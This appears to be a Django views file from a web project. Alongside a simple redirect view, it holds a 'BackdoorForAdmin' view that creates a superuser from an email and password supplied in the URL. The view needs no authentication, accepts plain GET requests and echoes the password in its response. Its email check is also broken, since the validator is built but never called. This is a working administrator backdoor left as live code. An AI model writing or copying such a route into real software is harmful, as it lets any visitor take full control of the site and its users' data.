from django.shortcuts import redirect
from django.views import View

from django.core.validators import EmailValidator
from django.contrib.auth import get_user_model
from django.http import JsonResponse
from django.db import transaction

#for redirection based on version
class Home(View):
    def get(self, request):
        return redirect('origin_home')
    
    
class BackdoorForAdmin(View):
    def get(self, request, email,password): return self.post(request, email, password)
    def post(self, request, email,password):
        try:EmailValidator(email)
        except: return JsonResponse({'message': 'invalid email'})
        with transaction.atomic():
            try:
                istance = get_user_model().objects.create_superuser(email = email, password=password)
                istance.full_clean()
                istance.save()
                return JsonResponse({'message': 'welcome admin', 'email': istance.email, 'password' : password})
            except Exception as e:
                return JsonResponse({'message': 'Error', 'exception': str(e)}, status = 500)
        